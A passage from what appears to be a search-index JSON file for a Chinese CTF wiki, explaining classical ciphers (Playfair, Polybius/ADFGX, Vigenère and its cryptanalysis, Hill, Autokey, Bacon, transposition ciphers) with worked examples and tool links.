\u82e5\u4e24\u4e2a\u5b57\u6bcd\u540c\u884c\uff0c\u53d6\u8fd9\u4e24\u4e2a\u5b57\u6bcd\u53f3\u65b9\u7684\u5b57\u6bcd\uff08\u82e5\u5b57\u6bcd\u5728\u6700\u53f3\u65b9\u5219\u53d6\u6700\u5de6\u65b9\u7684\u5b57\u6bcd\uff09\u3002  \u82e5\u4e24\u4e2a\u5b57\u6bcd\u540c\u5217\uff0c\u53d6\u8fd9\u4e24\u4e2a\u5b57\u6bcd\u4e0b\u65b9\u7684\u5b57\u6bcd\uff08\u82e5\u5b57\u6bcd\u5728\u6700\u4e0b\u65b9\u5219\u53d6\u6700\u4e0a\u65b9\u7684\u5b57\u6bcd\uff09\u3002     \u65b0\u627e\u5230\u7684\u4e24\u4e2a\u5b57\u6bcd\u5c31\u662f\u539f\u672c\u7684\u4e24\u4e2a\u5b57\u6bcd\u52a0\u5bc6\u7684\u7ed3\u679c\u3002  \u4ee5 playfair example \u4e3a\u5bc6\u5319\uff0c\u5f97  P L A Y F\nI R E X M\nB C D G H\nK N O Q S\nT U V W Z  \u8981\u52a0\u5bc6\u7684\u8baf\u606f\u4e3a Hide the gold in the tree stump  HI DE TH EG OL DI NT HE TR EX ES TU MP  \u5c31\u4f1a\u5f97\u5230  BM OD ZB XD NA BE KU DM UI XM MO UV IF", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/crypto/classical/polyalphabetic/#_2", 
            "text": "CAP4", 
            "title": "\u5de5\u5177"
        }, 
        {
            "location": "/crypto/classical/polyalphabetic/#polybius", 
            "text": "", 
            "title": "Polybius"
        }, 
        {
            "location": "/crypto/classical/polyalphabetic/#_3", 
            "text": "Polybius\u5bc6\u7801\u53c8\u79f0\u4e3a\u68cb\u76d8\u5bc6\u7801\uff0c\u5176\u4e00\u822c\u662f\u5c06\u7ed9\u5b9a\u7684\u660e\u6587\u52a0\u5bc6\u4e3a\u4e24\u4e24\u7ec4\u5408\u7684\u6570\u5b57\uff0c\u5176\u5e38\u7528\u5bc6\u7801\u8868      1  2  3  4  5      1  A  B  C  D  E    2  F  G  H  I/J  K    3  L  M  N  O  P    4  Q  R  S  T  U    5  V  W  X  Y  Z     \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u660e\u6587 HELLO\uff0c\u52a0\u5bc6\u540e\u5c31\u662f 23 15 31 31 34\u3002  \u53e6\u4e00\u79cd\u5bc6\u7801\u8868      A  D  F  G  X      A  b  t  a  l  p    D  d  h  o  z  k    F  q  f  v  s  n    G  g  j  c  u  x    X  m  r  e  w  y     \u6ce8\u610f\uff0c\u8fd9\u91cc\u5b57\u6bcd\u7684\u987a\u5e8f\u88ab\u6253\u4e71\u4e86\u3002  A D F G X \u7684\u7531\u6765\uff1a   1918 \u5e74\uff0c\u7b2c\u4e00\u6b21\u4e16\u754c\u5927\u6218\u5c06\u8981\u7ed3\u675f\u65f6\uff0c\u6cd5\u519b\u622a\u83b7\u4e86\u4e00\u4efd\u5fb7\u519b\u7535\u62a5\uff0c\u7535\u6587\u4e2d\u7684\u6240\u6709\u5355\u8bcd\u90fd\u7531 A\u3001D\u3001F\u3001G\u3001X \u4e94\u4e2a\u5b57\u6bcd\u62fc\u6210\uff0c\u56e0\u6b64\u88ab\u79f0\u4e3a ADFGX \u5bc6\u7801\u3002ADFGX \u5bc6\u7801\u662f 1918 \u5e74 3 \u6708\u7531\u5fb7\u519b\u4e0a\u6821 Fritz Nebel \u53d1\u660e\u7684\uff0c\u662f\u7ed3\u5408\u4e86 Polybius \u5bc6\u7801\u548c\u7f6e\u6362\u5bc6\u7801\u7684\u53cc\u91cd\u52a0\u5bc6\u65b9\u6848\u3002   \u4e3e\u4e2a\u4f8b\u5b50\uff0cHELLO\uff0c\u4f7f\u7528\u8fd9\u4e2a\u8868\u683c\u52a0\u5bc6\uff0c\u5c31\u662f DD XF AG AG DF\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/crypto/classical/polyalphabetic/#_4", 
            "text": "CrypTool", 
            "title": "\u5de5\u5177"
        }, 
        {
            "location": "/crypto/classical/polyalphabetic/#vigenere", 
            "text": "", 
            "title": "Vigenere \u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801"
        }, 
        {
            "location": "/crypto/classical/polyalphabetic/#_5", 
            "text": "\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\uff08Vigenere\uff09\u662f\u4f7f\u7528\u4e00\u7cfb\u5217\u51ef\u6492\u5bc6\u7801\u7ec4\u6210\u5bc6\u7801\u5b57\u6bcd\u8868\u7684\u52a0\u5bc6\u7b97\u6cd5\uff0c\u5c5e\u4e8e\u591a\u8868\u5bc6\u7801\u7684\u4e00\u79cd\u7b80\u5355\u5f62\u5f0f\u3002   \u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50  \u660e\u6587\uff1acome greatwall\n\u5bc6\u94a5\uff1acrypto  \u9996\u5148\uff0c\u5bf9\u5bc6\u94a5\u8fdb\u884c\u586b\u5145\u4f7f\u5176\u957f\u5ea6\u4e0e\u660e\u6587\u957f\u5ea6\u4e00\u6837\u3002     \u660e\u6587  c  o  m  e  g  r  e  a  t  w  a  l  l      \u5bc6\u94a5  c  r  y  p  t  o  c  r  y  p  t  o  c     \u5176\u6b21\uff0c\u67e5\u8868\u5f97\u5bc6\u6587   \u660e\u6587\uff1acome greatwall\n\u5bc6\u94a5\uff1acrypto\n\u5bc6\u6587\uff1aefkt zferrltzn", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/crypto/classical/polyalphabetic/#_6", 
            "text": "\u5bf9\u5305\u62ec\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u5728\u5185\u7684\u6240\u6709\u591a\u8868\u5bc6\u7801\u7684\u7834\u8bd1\u90fd\u662f\u4ee5\u5b57\u6bcd\u9891\u7387\u4e3a\u57fa\u7840\u7684\uff0c\u4f46\u76f4\u63a5\u7684\u9891\u7387\u5206\u6790\u5374\u5e76\u4e0d\u9002\u7528\uff0c\u8fd9\u662f\u56e0\u4e3a\u5728\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u4e2d\uff0c\u4e00\u4e2a\u5b57\u6bcd\u53ef\u4ee5\u88ab\u52a0\u5bc6\u6210\u4e0d\u540c\u7684\u5bc6\u6587\uff0c\u56e0\u800c\u7b80\u5355\u7684\u9891\u7387\u5206\u6790\u5728\u8fd9\u91cc\u5e76\u6ca1\u6709\u7528\u3002  \u7834\u8bd1\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u7684\u5173\u952e\u5728\u4e8e\u5b83\u7684\u5bc6\u94a5\u662f\u5faa\u73af\u91cd\u590d\u7684\u3002  \u5982\u679c\u6211\u4eec\u77e5\u9053\u4e86\u5bc6\u94a5\u7684\u957f\u5ea6\uff0c\u90a3\u5bc6\u6587\u5c31\u53ef\u4ee5\u88ab\u770b\u4f5c\u662f\u4ea4\u7ec7\u5728\u4e00\u8d77\u7684\u51ef\u6492\u5bc6\u7801\uff0c\u800c\u5176\u4e2d\u6bcf\u4e00\u4e2a\u90fd\u53ef\u4ee5\u5355\u72ec\u7834\u89e3\u3002\u5173\u4e8e\u5bc6\u7801\u7684\u957f\u5ea6\uff0c\u6211\u4eec\u53ef\u4ee5 \u4f7f\u7528\u5361\u897f\u65af\u57fa\u8bd5\u9a8c\u548c\u5f17\u91cc\u5fb7\u66fc\u8bd5\u9a8c\u6765\u83b7\u53d6\u3002  \u5361\u897f\u65af\u57fa\u8bd5\u9a8c\u662f\u57fa\u4e8e\u7c7b\u4f3c the \u8fd9\u6837\u7684\u5e38\u7528\u5355\u8bcd\u6709\u53ef\u80fd\u88ab\u540c\u6837\u7684\u5bc6\u94a5\u5b57\u6bcd\u8fdb\u884c\u52a0\u5bc6\uff0c\u4ece\u800c\u5728\u5bc6\u6587\u4e2d\u91cd\u590d\u51fa\u73b0\u3002\u4f8b\u5982\uff0c\u660e\u6587\u4e2d\u4e0d\u540c\u7684 CRYPTO \u53ef\u80fd\u88ab\u5bc6\u94a5 ABCDEF \u52a0\u5bc6\u6210\u4e0d\u540c\u7684\u5bc6\u6587\uff1a  \u5bc6\u94a5\uff1aABCDEF AB CDEFA BCD EFABCDEFABCD\n\u660e\u6587\uff1aCRYPTO IS SHORT FOR CRYPTOGRAPHY\n\u5bc6\u6587\uff1aCSASXT IT UKSWT GQU GWYQVRKWAQJB  \u6b64\u65f6\u660e\u6587\u4e2d\u91cd\u590d\u7684\u5143\u7d20\u5728\u5bc6\u6587\u4e2d\u5e76\u4e0d\u91cd\u590d\u3002\u7136\u800c\uff0c\u5982\u679c\u5bc6\u94a5\u76f8\u540c\u7684\u8bdd\uff0c\u7ed3\u679c\u53ef\u80fd\u4fbf\u4e3a\uff08\u4f7f\u7528\u5bc6\u94a5 ABCD\uff09\uff1a  \u5bc6\u94a5\uff1aABCDAB CD ABCDA BCD ABCDABCDABCD\n\u660e\u6587\uff1aCRYPTO IS SHORT FOR CRYPTOGRAPHY\n\u5bc6\u6587\uff1aCSASTP KV SIQUT GQU CSASTPIUAQJB  \u6b64\u65f6\u5361\u897f\u65af\u57fa\u8bd5\u9a8c\u5c31\u80fd\u4ea7\u751f\u6548\u679c\u3002\u5bf9\u4e8e\u66f4\u957f\u7684\u6bb5\u843d\u6b64\u65b9\u6cd5\u66f4\u4e3a\u6709\u6548\uff0c\u56e0\u4e3a\u901a\u5e38\u5bc6\u6587\u4e2d\u91cd\u590d\u7684\u7247\u6bb5\u4f1a\u66f4\u591a\u3002\u5982\u901a\u8fc7\u4e0b\u9762\u7684\u5bc6\u6587\u5c31\u80fd\u7834\u8bd1\u51fa\u5bc6\u94a5\u7684\u957f\u5ea6\uff1a  \u5bc6\u6587\uff1aDYDUXRMHTVDVNQDQNWDYDUXRMHARTJGWNQD  \u5176\u4e2d\uff0c\u4e24\u4e2a DYDUXRMH \u7684\u51fa\u73b0\u76f8\u9694\u4e86 18 \u4e2a\u5b57\u6bcd\u3002\u56e0\u6b64\uff0c\u53ef\u4ee5\u5047\u5b9a\u5bc6\u94a5\u7684\u957f\u5ea6\u662f 18 \u7684\u7ea6\u6570\uff0c\u5373\u957f\u5ea6\u4e3a 18\u30019\u30016\u30013 \u6216 2\u3002\u800c\u4e24\u4e2a NQD \u5219\u76f8\u8ddd 20 \u4e2a\u5b57\u6bcd\uff0c\u610f\u5473\u7740\u5bc6\u94a5\u957f\u5ea6\u5e94\u4e3a 20\u300110\u30015\u30014 \u6216 2\u3002\u53d6\u4e24\u8005\u7684\u4ea4\u96c6\uff0c\u5219\u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u5bc6\u94a5\u957f\u5ea6\u4e3a 2\u3002\u63a5\u4e0b\u6765\u5c31\u662f\u8fdb\u884c\u8fdb\u4e00\u6b65\u7684\u64cd\u4f5c\u4e86\u3002  \u5173\u4e8e\u66f4\u52a0\u8be6\u7ec6\u7684\u7834\u89e3\u539f\u7406\uff0c\u8fd9\u91cc\u6682\u65f6\u4e0d\u505a\u8fc7\u591a\u7684\u4ecb\u7ecd\u3002\u53ef\u4ee5\u53c2\u8003http:// www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-vigenere-cipher/ \u3002", 
            "title": "\u7834\u89e3"
        }, 
        {
            "location": "/crypto/classical/polyalphabetic/#_7", 
            "text": "\u5df2\u77e5\u5bc6\u94a5  Python \u7684 pycipher \u5e93  \u5728\u7ebf\u89e3\u5bc6 Vigen\u00e8re cipher  CAP4    \u672a\u77e5\u5bc6\u94a5  Vigen\u00e8re Cipher Codebreaker  Vigenere Solver  \uff0c\u4e0d\u591f\u5b8c\u5584\u3002", 
            "title": "\u5de5\u5177"
        }, 
        {
            "location": "/crypto/classical/polyalphabetic/#nihilist", 
            "text": "", 
            "title": "Nihilist"
        }, 
        {
            "location": "/crypto/classical/polyalphabetic/#_8", 
            "text": "Nihilist\u5bc6\u7801\u53c8\u79f0\u5173\u952e\u5b57\u5bc6\u7801\uff1a\u660e\u6587 + \u5173\u952e\u5b57 = \u5bc6\u6587\u3002\u4ee5\u5173\u952e\u5b57 helloworld \u4e3a\u4f8b\u3002  \u9996\u5148\u5229\u7528\u5bc6\u94a5\u6784\u9020\u68cb\u76d8\u77e9\u9635\uff08\u7c7b\u4f3c Polybius \u5bc6\u7801\uff09\n- \u65b0\u5efa\u4e00\u4e2a 5 \u00d7 5 \u77e9\u9635\n- \u5c06\u5b57\u7b26\u4e0d\u91cd\u590d\u5730\u4f9d\u6b21\u586b\u5165\u77e9\u9635\n- \u5269\u4e0b\u90e8\u5206\u6309\u5b57\u6bcd\u987a\u5e8f\u586b\u5165\n- \u5b57\u6bcd i \u548c j \u7b49\u4ef7      1  2  3  4  5      1  h  e  l  o  w    2  r  d  a  b  c    3  f  g  i / j  k  m    4  n  p  q  s  t    5  u  v  x  y  z     \u5bf9\u4e8e\u52a0\u5bc6\u8fc7\u7a0b\u53c2\u7167\u77e9\u9635 M \u8fdb\u884c\u52a0\u5bc6\uff1a  a -  M[2,3] -  23\nt -  M[4,5] -  45 \n\u5bf9\u4e8e\u89e3\u5bc6\u8fc7\u7a0b  \u53c2\u7167\u77e9\u9635 M \u8fdb\u884c\u89e3\u5bc6\uff1a  23 -  M[2,3] -  a\n45 -  M[4,5] -  t \n\u53ef\u4ee5\u770b\u51fa\uff0c\u5bc6\u6587\u7684\u7279\u5f81\u6709\u5982\u4e0b\u51e0\u70b9   \u7eaf\u6570\u5b57  \u53ea\u5305\u542b 1 \u5230 5  \u5bc6\u6587\u957f\u5ea6\u5076\u6570\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/crypto/classical/polyalphabetic/#hill", 
            "text": "", 
            "title": "Hill"
        }, 
        {
            "location": "/crypto/classical/polyalphabetic/#_9", 
            "text": "\u5e0c\u5c14\u5bc6\u7801\uff08Hill\uff09\u4f7f\u7528\u6bcf\u4e2a\u5b57\u6bcd\u5728\u5b57\u6bcd\u8868\u4e2d\u7684\u987a\u5e8f\u4f5c\u4e3a\u5176\u5bf9\u5e94\u7684\u6570\u5b57\uff0c\u5373A=0\uff0cB=1\uff0cC=2 \u7b49\uff0c\u7136\u540e\u5c06\u660e\u6587\u8f6c\u5316\u4e3a n \u7ef4\u5411\u91cf\uff0c\u8ddf\u4e00\u4e2a n \u00d7 n \u7684\u77e9\u9635\u76f8\u4e58\uff0c\u518d\u5c06\u5f97\u51fa\u7684\u7ed3\u679c\u6a21 26\u3002\u6ce8\u610f\u7528\u4f5c\u52a0\u5bc6\u7684\u77e9\u9635\uff08\u5373\u5bc6\u5319\uff09\u5728  \\mathbb{Z}_{26}^{n} \\mathbb{Z}_{26}^{n}  \u5fc5\u987b\u662f\u53ef\u9006\u7684\uff0c\u5426\u5219\u5c31\u4e0d\u53ef\u80fd\u89e3\u7801\u3002\u53ea\u6709\u77e9\u9635\u7684\u884c\u5217\u5f0f\u548c 26 \u4e92\u8d28\uff0c\u624d\u662f\u53ef\u9006\u7684\u3002\u4e0b\u9762\u4e3e\u4e00\u4e2a\u4f8b\u5b50  \u660e\u6587\uff1aACT  \u5c06\u660e\u6587\u5316\u4e3a\u77e9\u9635\u3002   \n\\begin{bmatrix}\n0\\\\\n2\\\\\n19\n\\end{bmatrix}  \n\\begin{bmatrix}\n0\\\\\n2\\\\\n19\n\\end{bmatrix}   \u5047\u8bbe\u5bc6\u94a5\u4e3a\uff1a   \n\\begin{bmatrix}\n6   24   1\\\\\n13   16   10\\\\\n20   17   15\n\\end{bmatrix}  \n\\begin{bmatrix}\n6 & 24 & 1\\\\\n13 & 16 & 10\\\\\n20 & 17 & 15\n\\end{bmatrix}   \u52a0\u5bc6\u8fc7\u7a0b\u4e3a\uff1a   \n\\begin{bmatrix}\n6   24   1\\\\\n13   16   10\\\\\n20   17   15\n\\end{bmatrix}\n\\begin{bmatrix}\n0\\\\\n2\\\\\n19\n\\end{bmatrix}\n\\equiv\n\\begin{bmatrix}\n67\\\\\n222\\\\\n319\n\\end{bmatrix}\n\\equiv\n\\begin{bmatrix}\n15\\\\\n14\\\\\n7\n\\end{bmatrix}\n\\bmod 26  \n\\begin{bmatrix}\n6 & 24 & 1\\\\\n13 & 16 & 10\\\\\n20 & 17 & 15\n\\end{bmatrix}\n\\begin{bmatrix}\n0\\\\\n2\\\\\n19\n\\end{bmatrix}\n\\equiv\n\\begin{bmatrix}\n67\\\\\n222\\\\\n319\n\\end{bmatrix}\n\\equiv\n\\begin{bmatrix}\n15\\\\\n14\\\\\n7\n\\end{bmatrix}\n\\bmod 26   \u5bc6\u6587\u5373\u4e3a  \u5bc6\u6587\uff1aPOH", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/crypto/classical/polyalphabetic/#_10", 
            "text": "http://www.practicalcryptography.com/ciphers/hill-cipher/  CAP4  Cryptool", 
            "title": "\u5de5\u5177"
        }, 
        {
            "location": "/crypto/classical/polyalphabetic/#_11", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5ISCC 2015 base decrypt 150\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9898\u76ee\u4e3a   \u5bc6\u6587\uff1a 22,09,00,12,03,01,10,03,04,08,01,17 \uff08wjamdbkdeibr\uff09  \u4f7f\u7528\u7684\u77e9\u9635\u662f 1 2 3 4 5 6 7 8 10  \u8bf7\u5bf9\u5bc6\u6587\u89e3\u5bc6.   \u9996\u5148\uff0c\u77e9\u9635\u662f 3 \u00d7 3 \u7684\u3002\u8bf4\u660e\u6bcf\u6b21\u52a0\u5bc63\u4e2a\u5b57\u7b26\u3002\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 Cryptool\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e2a\u77e9\u9635\u662f\u6309\u7167\u5217\u6765\u6392\u5e03\u7684\u3002\u5373\u5982\u4e0b  1 4 7\n2 5 8\n3 6 10  \u6700\u540e\u7684\u7ed3\u679c\u4e3a  overthehillx \u3002", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/crypto/classical/polyalphabetic/#autokeycipher", 
            "text": "", 
            "title": "AutokeyCipher"
        }, 
        {
            "location": "/crypto/classical/polyalphabetic/#_12", 
            "text": "\u81ea\u52a8\u5bc6\u94a5\u5bc6\u7801\uff08Autokey Cipher\uff09\u4e5f\u662f\u591a\u8868\u66ff\u6362\u5bc6\u7801\uff0c\u4e0e\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u5bc6\u7801\u7c7b\u4f3c\uff0c\u4f46\u4f7f\u7528\u4e0d\u540c\u7684\u65b9\u6cd5\u751f\u6210\u5bc6\u94a5\u3002\u901a\u5e38\u6765\u8bf4\u5b83\u8981\u6bd4\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u66f4\u5b89\u5168\u3002\u81ea\u52a8\u5bc6\u94a5\u5bc6\u7801\u4e3b\u8981\u6709\u4e24\u79cd\uff0c\u5173\u952e\u8bcd\u81ea\u52a8\u5bc6\u94a5\u5bc6\u7801\u548c\u539f\u6587\u81ea\u52a8\u5bc6\u94a5\u5bc6\u7801\u3002\u4e0b\u9762\u6211\u4eec\u4ee5\u5173\u952e\u8bcd\u81ea\u52a8\u5bc6\u94a5\u4e3a\u4f8b\uff1a  \u660e\u6587\uff1aTHE QUICK BROWN FOX JUMPS OVER THE LAZY DOG\n\u5173\u952e\u8bcd\uff1aCULTURE  \u81ea\u52a8\u751f\u6210\u5bc6\u94a5\uff1a  CULTURE THE QUICK BROWN FOX JUMPS OVER THE  \u63a5\u4e0b\u6765\u7684\u52a0\u5bc6\u8fc7\u7a0b\u548c\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u7c7b\u4f3c\uff0c\u4ece\u76f8\u5e94\u7684\u8868\u683c\u53ef\u5f97\uff1a  \u5bc6\u6587  VBP JOZGD IVEQV HYY AIICX CSNL FWW ZVDP WVK", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/crypto/classical/polyalphabetic/#_13", 
            "text": "\u5df2\u77e5\u5173\u952e\u8bcd  Python \u7684 pycipher \u5e93    \u672a\u77e5\u5173\u952e\u8bcd  http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/  tools \u6587\u4ef6\u5939\u4e0b break_autokey.py\uff0c\u5f85\u5b8c\u6210\u3002", 
            "title": "\u5de5\u5177"
        }, 
        {
            "location": "/crypto/classical/others/", 
            "text": "\u57f9\u6839\u5bc6\u7801\n\n\n\u539f\u7406\n\n\n\u57f9\u6839\u5bc6\u7801\u4f7f\u7528\u4e24\u79cd\u4e0d\u540c\u7684\u5b57\u4f53\uff0c\u4ee3\u8868 A \u548c B\uff0c\u7ed3\u5408\u52a0\u5bc6\u8868\u8fdb\u884c\u52a0\u89e3\u5bc6\u3002\n\n\n\n\n\n\n\n\na\n\n\nAAAAA\n\n\ng\n\n\nAABBA\n\n\nn\n\n\nABBAA\n\n\nt\n\n\nBAABA\n\n\n\n\n\n\n\n\n\n\nb\n\n\nAAAAB\n\n\nh\n\n\nAABBB\n\n\no\n\n\nABBAB\n\n\nu-v\n\n\nBAABB\n\n\n\n\n\n\nc\n\n\nAAABA\n\n\ni-j\n\n\nABAAA\n\n\np\n\n\nABBBA\n\n\nw\n\n\nBABAA\n\n\n\n\n\n\nd\n\n\nAAABB\n\n\nk\n\n\nABAAB\n\n\nq\n\n\nABBBB\n\n\nx\n\n\nBABAB\n\n\n\n\n\n\ne\n\n\nAABAA\n\n\nl\n\n\nABABA\n\n\nr\n\n\nBAAAA\n\n\ny\n\n\nBABBA\n\n\n\n\n\n\nf\n\n\nAABAB\n\n\nm\n\n\nABABB\n\n\ns\n\n\nBAAAB\n\n\nz\n\n\nBABBB\n\n\n\n\n\n\n\n\n\u4e0a\u9762\u7684\u662f\u5e38\u7528\u7684\u52a0\u5bc6\u8868\u3002\u8fd8\u6709\u53e6\u5916\u7684\u4e00\u79cd\u52a0\u5bc6\u8868\uff0c\u53ef\u8ba4\u4e3a\u662f\u5c06 26 \u4e2a\u5b57\u6bcd\u4ece 0 \u5230 25 \u6392\u5e8f\uff0c\u4ee5\u4e8c\u8fdb\u5236\u8868\u793a\uff0cA \u4ee3\u8868 0\uff0cB \u4ee3\u8868 1\u3002\n\n\n\u4e0b\u9762\u8fd9\u4e00\u6bb5\u5185\u5bb9\u5c31\u662f\u660e\u6587 steganography \u52a0\u5bc6\u540e\u7684\u5185\u5bb9\uff0c\u6b63\u5e38\u5b57\u4f53\u662f A\uff0c\u7c97\u4f53\u662f B\uff1a\n\n\nT\no en\nco\nde \na\n mes\ns\nage e\nac\nh letter \nof\n the \npl\na\ni\nnt\nex\nt \ni\ns replaced b\ny a g\nrou\np of f\ni\nve\n of \nth\ne lett\ners\n \n'A'\n o\nr 'B'\n.\n\n\n\u53ef\u4ee5\u770b\u5230\uff0c\u57f9\u6839\u5bc6\u7801\u4e3b\u8981\u6709\u4ee5\u4e0b\u7279\u70b9\n\n\n\n\n\u53ea\u6709\u4e24\u79cd\u5b57\u7b26\n\n\n\u6bcf\u4e00\u6bb5\u7684\u957f\u5ea6\u4e3a 5 \n\n\n\u52a0\u5bc6\u5185\u5bb9\u4f1a\u6709\u7279\u6b8a\u7684\u5b57\u4f53\u4e4b\u5206\uff0c\u4ea6\u6216\u8005\u5927\u5c0f\u5199\u4e4b\u5206\u3002\n\n\n\n\n\u5de5\u5177\n\n\n\n\nhttp://rumkin.com/tools/cipher/baconian.php\n\n\n\n\n\u6805\u680f\u5bc6\u7801\n\n\n\u539f\u7406\n\n\n\u6805\u680f\u5bc6\u7801\u628a\u8981\u52a0\u5bc6\u7684\u660e\u6587\u5206\u6210 N \u4e2a\u4e00\u7ec4\uff0c\u7136\u540e\u628a\u6bcf\u7ec4\u7684\u7b2c 1 \u4e2a\u5b57\u8fde\u8d77\u6765\uff0c\u5f62\u6210\u4e00\u6bb5\u65e0\u89c4\u5f8b\u7684\u8bdd\u3002\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\n\n\n\u660e\u6587\uff1aTHERE IS A CIPHER\n\n\n\n\n\u53bb\u6389\u7a7a\u683c\u540e\u53d8\u4e3a\n\n\nTHEREISACIPHER\n\n\n\n\n\u5206\u6210\u4e24\u680f\uff0c\u4e24\u4e2a\u4e00\u7ec4\u5f97\u5230\n\n\nTH ER EI SA CI PH ER\n\n\n\n\n\u5148\u53d6\u51fa\u7b2c\u4e00\u4e2a\u5b57\u6bcd\uff0c\u518d\u53d6\u51fa\u7b2c\u4e8c\u4e2a\u5b57\u6bcd\n\n\nTEESCPE\nHRIAIHR\n\n\n\n\n\u8fde\u5728\u4e00\u8d77\u5c31\u662f\n\n\nTEESCPEHRIAIHR\n\n\n\n\n\u4e0a\u8ff0\u660e\u6587\u4e5f\u53ef\u4ee5\u5206\u4e3a2\u680f\u3002\n\n\nTHEREIS ACIPHER\n\n\n\n\n\u7ec4\u5408\u5f97\u5230\u5bc6\u6587\n\n\nTAHCEIRPEHIESR\n\n\n\n\n\u5de5\u5177\n\n\n\u5f85\u8865\u5145\u3002\n\n\n\u66f2\u8def\u5bc6\u7801\n\n\n\u539f\u7406\n\n\n\u66f2\u8def\u5bc6\u7801\uff08Curve Cipher\uff09\u662f\u4e00\u79cd\u6362\u4f4d\u5bc6\u7801\uff0c\u9700\u8981\u4e8b\u5148\u53cc\u65b9\u7ea6\u5b9a\u5bc6\u94a5\uff08\u4e5f\u5c31\u662f\u66f2\u8def\u8def\u5f84\uff09\u3002\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\n\n\n\u660e\u6587\uff1aThe quick brown fox jumps over the lazy dog\n\n\n\n\n\u586b\u5165 5 \u884c 7 \u5217\u8868\uff08\u4e8b\u5148\u7ea6\u5b9a\u586b\u5145\u7684\u884c\u5217\u6570\uff09\n\n\n\n\n\u52a0\u5bc6\u7684\u56de\u8def\u7ebf\uff08\u4e8b\u5148\u7ea6\u5b9a\u586b\u5145\u7684\u884c\u5217\u6570\uff09\n\n\n\n\n\u5bc6\u6587\uff1agesfc inpho dtmwu qoury zejre hbxva lookT\n\n\n\n\n\u5217\u79fb\u4f4d\u52a0\u5bc6\n\n\n\u539f\u7406\n\n\n\u5217\u79fb\u4f4d\u5bc6\u7801\uff08Columnar Transposition Cipher\uff09\u662f\u4e00\u79cd\u6bd4\u8f83\u7b80\u5355\uff0c\u6613\u4e8e\u5b9e\u73b0\u7684\u6362\u4f4d\u5bc6\u7801\uff0c\u901a\u8fc7\u4e00\u4e2a\u7b80\u5355\u7684\u89c4\u5219\u5c06\u660e\u6587\u6253\u4e71\u6df7\u5408\u6210\u5bc6\u6587\u3002\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\u3002\n\n\n\u6211\u4eec\u4ee5\u660e\u6587 \nThe quick brown fox jumps over the lazy dog\n\uff0c\u5bc6\u94a5 \nhow are u\n \u4e3a\u4f8b\uff1a\n\n\n\u5c06\u660e\u6587\u586b\u5165 5 \u884c 7 \u5217\u8868\uff08\u4e8b\u5148\u7ea6\u5b9a\u586b\u5145\u7684\u884c\u5217\u6570\uff0c\u5982\u679c\u660e\u6587\u4e0d\u80fd\u586b\u5145\u5b8c\u8868\u683c\u53ef\u4ee5\u7ea6\u5b9a\u4f7f\u7528\u67d0\u4e2a\u5b57\u6bcd\u8fdb\u884c\u586b\u5145\uff09\n\n\n\n\n\u5bc6\u94a5\uff1a \nhow are u\n\uff0c\u6309 \nhow are u\n \u5728\u5b57\u6bcd\u8868\u4e2d\u7684\u51fa\u73b0\u7684\u5148\u540e\u987a\u5e8f\u8fdb\u884c\u7f16\u53f7\uff0c\u6211\u4eec\u5c31\u6709 a \u4e3a 1\uff0ce \u4e3a 2\uff0ch \u4e3a 3\uff0co \u4e3a 4\uff0cr \u4e3a 5\uff0cu \u4e3a 6\uff0cw \u4e3a 7\uff0c\u6240\u4ee5\u5148\u5199\u51fa a \u5217\uff0c\u5176\u6b21 e \u5217\uff0c\u4ee5\u6b64\u7c7b\u63a8\u5199\u51fa\u7684\u7ed3\u679c\u4fbf\u662f\u5bc6\u6587\uff1a\n\n\n\n\n\u5bc6\u6587\uff1a \nqoury inpho Tkool hbxva uwmtd cfseg erjez\n\n\n\u5de5\u5177\n\n\n\n\nhttp://www.practicalcryptography.com/ciphers/classical-era/columnar-transposition/\n \u884c\u5217\u6570\u76f8\u7b49\n\n\n\n\n01248 \u5bc6\u7801\n\n\n\u539f\u7406\n\n\n\u8be5\u5bc6\u7801\u53c8\u79f0\u4e3a\u4e91\u5f71\u5bc6\u7801\uff0c\u4f7f\u7528 0\uff0c1\uff0c2\uff0c4\uff0c8 \u56db\u4e2a\u6570\u5b57\uff0c\u5176\u4e2d 0 \u7528\u6765\u8868\u793a\u95f4\u9694\uff0c\u5176\u4ed6\u6570\u5b57\u4ee5\u52a0\u6cd5\u53ef\u4ee5\u8868\u793a\u51fa \u5982\uff1a28=10\uff0c124=7\uff0c18=9\uff0c\u518d\u7528 1-\n26 \u8868\u793a A-\nZ\u3002\n\n\n\u53ef\u4ee5\u770b\u51fa\u8be5\u5bc6\u7801\u6709\u4ee5\u4e0b\u7279\u70b9\n\n\n\n\n\u53ea\u6709 0\uff0c1\uff0c2\uff0c4\uff0c8\n\n\n\n\n\u4f8b\u5b50\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5CFF 2016 